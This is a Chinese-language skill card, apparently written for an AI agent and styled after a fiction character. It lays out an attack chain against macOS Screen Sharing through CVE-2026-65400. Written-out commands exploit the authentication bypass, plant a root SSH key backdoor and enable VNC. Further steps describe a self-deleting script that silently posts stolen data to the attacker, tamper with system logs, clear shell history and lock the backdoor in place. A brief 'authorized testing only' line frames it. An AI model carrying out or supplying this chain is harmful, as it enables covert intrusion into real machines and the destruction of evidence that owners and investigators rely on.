---
name: 白凝冰·遥控
description: >-
  大爱仙尊·macOS屏幕共享5900渗透：CVE-2026-65400认证绕过→SSH后门→ARD VNC→静默回传→不留痕清理。
---

> **白凝冰**
> 万丈红尘缤纷彩，天涯云水路遥长。
> 此刻风流归天地，不胜水中明月光。

# macos-remote-control-pentest（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/macos-remote-control-pentest/SKILL.md`
- 手法：`传承/逆骨·认族.md`
- 工具：`python3 炼蛊房/reverse_skill_route.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name macos-remote-control-pentest`

---

# macOS 屏幕共享/远程管理渗透（CVE-2026-65400 完整链）

## 触发条件
- 目标 macOS 开启屏幕共享/远程管理（TCP 5900，RFB/SRP 协议）
- 版本未打补丁：Tahoe 26 ≤26.6 / Sequoia 15 ≤15.7.8 / Sonoma 14 ≤14.8.8（修复版 26.6.1 / 15.7.9 / 14.8.9）
- 攻击机任意（Mac/Linux/Windows），只需 Python3 + 能连目标 5900；攻击机自身版本/是否开屏幕共享与利用无关

## 漏洞本质
`screensharingd` 的 SRP 认证状态机缺陷：frame-length 校验器返回过期成功状态 → 连接在凭据验证前被标记已认证。密码学没破，是状态机逻辑问题。过了门会话明文，`SSFileCopySender/SSFileCopyReceiver` 带 Full Disk Access → **root 任意文件读写 + TCC 绕过**。改密码/删用户/关 legacy VNC 全部无效（bug 在认证之前）。

## 攻击链（6步）
1. **验证**：`python3 exploit.py <IP> /etc/sudoers`（SecurityResult≠0 = 已打补丁，放弃）
2. **拿登录用户名**：`exploit.py <IP> /Library/Preferences/com.apple.loginwindow.plist -o lw.plist`，解析 `lastUserName`；可再列 `/var/db/dslocal/nodes/Default/users/` 和 `/Users/` 目录
3. **读原 key 合并（防覆盖！）**：`exploit.py <IP> /var/root/.ssh/authorized_keys -o orig.key` → `cat orig.key 新公钥 > merged`
4. **写后门**：`exploit.py <IP> -w merged -m 0600 /var/root/.ssh/authorized_keys` → **回读验证 sha256 一致**
5. **SSH 登录**：`ssh -i key root@<IP>`
6. **需要图形时开 VNC**（见下）

## 开 VNC（ARD kickstart，系统自带零落地）
```bash
# 开启（SSH会话里执行）
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
  -activate -configure -access on \
  -clientopts -setvnclegacy -vnclegacy yes \
  -setvncpw -vncpw '密码' -restart -agent -console
# 状态 / 关闭
.../kickstart -status
.../kickstart -deactivate -stop
```
攻击机连接：`vnc://<IP>:5900`（Mac 自带屏幕共享/Finder，或 TigerVNC/RealVNC）。防休眠：`sudo pmset -a sleep 0; sudo caffeinate -d`。

## 静默部署模式（被控方无感知）
- 攻击机开 HTTP 接收端（python 单行 HTTPServer，POST 8888 打印 body）
- 被控方跑静默脚本 `<攻击机IP>`：全部输出重定向黑洞，关键信息 curl POST 回传；**验证 HTTP 200 后才自毁 `rm -f $0`**，失败保留脚本；双端口尝试（指定端口+8888）

## 清理不留痕（cleanup 脚本）
- `kickstart -deactivate -stop` + `launchctl disable system/com.apple.screensharing`
- 删 authorized_keys 中带 `cve65400` 注释的 key（生成 key 时 `-C "cve65400"` 便于识别，不误删原 key）
- `systemsetup -setremotelogin off`
- `sed -i '' '/sshd/d;/ARD/d;/screensharing/d'` 过滤 /var/log/system.log；清空 ardagent.log；清空 shell 历史
- 远程执行：`ssh -i key root@IP 'bash -s' < cleanup.sh`

## 持久化加固
- `chflags uchg /var/root/.ssh/authorized_keys`（加锁防删）
- 双后门：root + 用户路径各一份

## 坑（血泪）
- **write 是整文件覆盖不是追加** → 必须先读原 authorized_keys 合并，否则覆盖原 key 立刻暴露
- 漏洞 racy：默认重试 25 次，失败等 1 分钟再试
- SIP 不影响（FileCopy helper 干的）；TCC 被绕过无需配置
- 装了企业 EDR/MDM 的目标不保证隐蔽

## 边界
- 仅授权测试。AI 可做全部准备工作（下载工具/写脚本/生成密钥/环境检查），不直接代打攻击目标

## 本机工具（/root/，已备好）
- `CVE-2026-65400/exploit.py`（acheong08 版，读+写，`-u` 指定用户默认 root）
- `attack_auto.sh`（攻击方全自动7步：下载exploit→生成key→验证→拿登录信息→合并key→写后门→SSH测试）
- `cleanup_target.sh`（清理不留痕）
- `CVE-2026-65400_一键配置_被控方_静默版.sh`（被控方静默配置+自毁）
- `cve65400_key` / `cve65400_key.pub`（注释 cve65400）

## PoC 仓库（GitHub）
- `acheong08/CVE-2026-65400` — 完整 exploit.py（读写+提权链）
- `panchocosil/CVE-2026-65400-poc` — 只读 PoC
- `HORKimhab/CVE-2026-65400` — ⚠️ get-svn.sh 疑似供应链投毒，**别碰**
